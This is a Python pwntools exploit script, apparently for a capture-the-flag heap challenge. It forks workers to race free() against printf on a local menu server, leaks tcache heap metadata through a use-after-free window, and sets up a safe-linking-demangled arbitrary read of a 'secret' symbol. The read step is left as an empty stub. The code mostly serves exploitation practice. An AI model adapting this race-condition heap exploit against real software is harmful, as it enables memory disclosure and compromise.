#!/bin/python 

import os
import sys
import time
import argparse
import pwn as p


SCANF_INPUT_SIZE = 1024
HEAP_FIRST_OFF   = 0xf30

DATA_PREFIX = b"MESSAGE: "
DATA_PREFIX_LEN = len(DATA_PREFIX)

TRIES = 10000

p.context.arch = 'amd64'
args = None
proc, elf, libc = (None, None, None)
pids = []


def get_server():
    global proc, elf, libc
    if args.noaslr:
        proc = p.process(sys.argv[1], setuid=False, aslr=False)
    else:
        proc = p.process(sys.argv[1:])
    elf  = proc.elf
    libc = elf.libc
    assert libc is not None


def restart_server():
    proc.kill()
    get_server()


def attach_gdb(gdbscript=""):
    if not (args.gef or args.pwndbg):
        return

    gdbscript = ("gef-init\n" if args.gef else "pwndbg-init\n") + gdbscript
    p.gdb.attach(proc, gdbscript=gdbscript)
    time.sleep(1)


class thread_comm(p.remote):
    def __init__(self, host="localhost", port=1337):
        if proc is None:
            print("!WARNING! Proc isn't started.")
        super().__init__(host, port)
        self.own_payload = b""


    def prompt_cmd(self, cmd, do_send=True):
        if len(cmd) > SCANF_INPUT_SIZE:
            print("!WARNING! Length of cmd is larger than input max size.")
            cmd = cmd[:SCANF_INPUT_SIZE]
        if isinstance(cmd, str):
            cmd = cmd.encode()

        if do_send:
            self.sendline(cmd)
        else:
            self.own_payload += cmd + b' '


    def get_payload(self):
        ret = self.own_payload[:-1]
        self.own_payload = b""
        return ret


    def send_idx(self, idx):
        self.sendline(str(idx).encode())


    def printf(self, idx: bytes, do_recv=True):
        self.sendline(b"printf " + idx)
        if do_recv:
            self.recvuntil(DATA_PREFIX)
            return self.recvline(drop=True)


    def malloc(self, idx: bytes, do_send=False):
        self.prompt_cmd(b"malloc " + idx, do_send)


    def scanf(self, idx: bytes, msg, do_send=False):
        cmd = b"scanf " + idx + b' ' + msg
        self.prompt_cmd(cmd, do_send)


    def free(self, idx: bytes, do_send=False):
        self.prompt_cmd(b"free " + idx, do_send)


    def send_flag(self):
        self.prompt_cmd(b"send_flag")
        if self.recvuntil(b"pwn.", timeout=2) != b"":
            return self.recv(55)
        return b""


def make_workers(num: int, fn, *args):
    for i in range(num):
        pid = os.fork()
        if not pid:
            for _ in range(TRIES):
                fn(*args)
            sys.exit(0)
        pids.append(pid)


def to_addr(b: bytes):
    return p.u64(b[:8].ljust(8, b'\x00'))


def fix_idx(idx):
    return idx if isinstance(idx, bytes) else str(idx).encode()


# We malloc, scanf 16 random bytes to buffer and then race:
# thd1: strlen(buf) => returns 16 bytes
# thd2: free(buf)   => get metadata into buf
# thd1: write(1, buf, stlren) => syscall writing out the metadata
def tcache_leak(thd1: thread_comm, thd2: thread_comm):
    scanf_bytes = p.cyclic(16)
    thd1.malloc(b'0')
    thd1.scanf(b'0', scanf_bytes)
    thd1.free(b'0')
    make_workers(1, thd1.sendline, thd1.get_payload())

    for _ in range(TRIES):
        thd2.printf(b'0', do_recv=False)

    results = set(thd2.clean().splitlines())
    print(results)
    for res in results:
        ret = res[DATA_PREFIX_LEN:]
        if len(ret) == 16 and ret != scanf_bytes:
            return to_addr(ret)

    return 0


def get_tcache_leak():
    thd1 = thread_comm()
    thd2 = thread_comm()

    for _ in range(TRIES):
        tcache_addr = tcache_leak(thd1, thd2)
        if tcache_addr:
            break
    return tcache_addr


def arbitrary_read(target_addr: int, tcache_addr_leak: int):
    target_addr = target_addr ^ (tcache_addr_leak)
    print("target_addr (mangled):: " + hex(target_addr))


    return b''


def exploit():
    tcache_addr = get_tcache_leak()
    if not tcache_addr:
        print("No leak...")
        return
    print("tcache_addr:: " + hex(tcache_addr))

    secret = arbitrary_read(elf.symbols['secret'], tcache_addr)
    print("Leaked secret:", secret)


def main():
    parser = argparse.ArgumentParser(usage="Usage: ./script.py [binary]")
    parser.add_argument('binary')
    parser.add_argument('-g', "--gef",   action='store_true')
    parser.add_argument('-p', "--pwndbg",   action='store_true')
    parser.add_argument('-n', "--noaslr", action='store_true')
    parser.add_argument('-l', "--log-level", default='info', type=str)

    global args
    args = parser.parse_args()
    p.context.log_level = args.log_level

    get_server()
    exploit()

    proc.interactive()


if __name__ == '__main__':
    main()
